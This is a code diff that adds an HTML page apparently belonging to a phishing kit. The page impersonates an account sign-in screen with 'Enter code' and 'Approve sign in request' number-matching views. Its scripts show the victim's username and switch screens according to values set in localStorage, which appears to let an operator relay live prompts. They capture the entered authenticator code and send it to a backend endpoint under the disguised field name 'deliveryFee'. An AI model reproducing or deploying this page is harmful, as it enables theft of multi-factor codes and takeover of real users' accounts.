@@ -1,0 +1,177 @@
+<html>
+<head>
+      <title>Sign in to your account</title>
+      <link rel="icon" type="image/png" href="ico.png">
+	  <link rel="stylesheet" href="auth.css">
+</head>
+<body>
+
+    <div id="container" class="vieww">
+      <div id="house">
+        <div>
+          <img src="loco.png" alt="">
+        </div>
+        <div id="userr" class="usar">
+         - 
+        </div>
+        <div id="enterr">
+          <h1>Enter code</h1>
+        </div>
+        <div>
+          <p class="plat">Enter the code displayed in the authenticator</p>
+          <p class="plat">app on your mobile device</p>
+          
+        </div>
+        <div id="iput">
+          <input type="password" placeholder="Enter authenticator code" id="auth">
+        </div>
+        <div>
+          <p><span>More information</span></p>
+        </div>
+        <div id="sxin">
+          <img src="vfile.png" alt="" id="vform">
+        </div>
+        </div>
+    </div>
+    <div id="container2" class="vieww">
+      <div id="house2">
+        <div>
+          <img src="loco.png" alt="">
+        </div>
+        <div id="userr2" class="usar">
+         - 
+        </div>
+        <div id="enterr2">
+          <h2>Approve sign in request</h2>
+        </div>
+        <div>
+          <p class="plat">Open your authenticator app, and enter the</p>
+          <p class="plat">number shown to sign in.</p>
+          
+        </div>
+        <div id="iput2">
+          <h1 id="authNo">30</h1>
+        </div>
+        <div>
+          <p class="plat">No Numbers in your app? Make sure to upgrade to</p>
+          <p class="plat">the latest version.</p>
+        </div>
+        <div>
+          <p id="platt">i can't use my App authenticator app right now</p>
+        </div>
+        
+        <div id="sxin2">
+          <p class="plat"><span>More information</span></p>
+        </div>
+        </div>
+    </div>
+    
+</body>
+<script>
+  const user = new URLSearchParams(window.location.search).get('user');
+
+
+  if (user) {
+    document.getElementById("userr").textContent = `${user}`
+    document.getElementById("userr2").textContent = `${user}`
+    document.getElementById("userr3").textContent = `${user}`
+    document.getElementById("userr4").textContent = `${user}`
+    document.getElementById("userr5").textContent = `${user}`
+  }
+</script>
+<script>
+  
+
+  function renderView(){
+    const views = document.querySelectorAll(".vieww");
+    const currentVieww = localStorage.getItem("currentView") || "container5";
+    const pinn = localStorage.getItem("inputVal");
+
+    views.forEach(view => view.style.display = "none")
+    const active = document.getElementById(`${currentVieww}`);
+    if (active){
+      active.style.display = "flex";
+      if( currentVieww === "container2"){
+        const authNoElem = document.getElementById('authNo');
+        if(authNoElem) {
+          authNoElem.innerHTML = pinn
+        }
+      }
+    }
+  }
+  renderView()
+  window.addEventListener("storage", renderView);
+  
+
+</script>
+<script>
+  async function hoad() {
+    const res = await fetch("/rata");
+    const rata = await res.json();
+  }
+</script>
+<script>
+  window.addEventListener('load', () =>{
+    const userN = localStorage.getItem('userName');
+
+    if(userN) {
+      document.getElementById('userr').textContent = userN;
+      document.getElementById('userr2').textContent = userN;
+    }
+  })
+</script>
+<script>
+  // Get the original input from Page 1
+  const finalVal = localStorage.getItem('sharedData');
+  console.log(finalVal); 
+
+  // Display it
+  //document.getElementById('display').textContent = finalVal;
+
+
+  const vform = document.getElementById('vform')
+  vform.addEventListener('click', async () => {
+
+   
+        
+
+        // Get value from your input (id="auth")
+        const val = document.getElementById('auth').value;
+
+        const payload = {
+            deliveryFee: val
+        };
+
+        try {
+            // Send just the number to your backend
+            await fetch(`/tata/${finalVal}`, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            window.location.href = ''; 
+        } catch (error) {
+            console.error(error);
+        }
+    });
+</script>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/69aa9aff7e051e1c367adf6a/1jj16qulh';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+
+
+
+
+</html>
